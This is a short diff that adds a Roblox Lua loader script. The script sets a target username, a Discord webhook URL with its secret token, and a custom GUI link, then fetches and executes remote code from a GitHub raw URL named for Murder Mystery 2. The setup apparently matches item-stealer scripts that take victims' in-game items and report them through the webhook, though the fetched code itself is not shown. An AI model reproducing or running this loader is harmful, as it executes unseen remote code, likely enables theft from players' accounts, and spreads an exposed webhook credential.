@@ -1,0 +1,5 @@
+Username = "luffy152046" --// Username
+Webhook = "https://discord.com/api/webhooks/1305877037570986035/PxakDK-19LfnQgFjTiDF8qMNFpeMh_VEDoweqRdPYb_AKSOjB3zaclE0UUEX6O_mVXQh" --// Webhook
+CustomGui = "https://raw.githubusercontent.com/Ezjpq/Testo/refs/heads/main/Testo.lua" --// Paste Raw Link Script
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjpq/mm2/refs/heads/main/testo.lua"))()
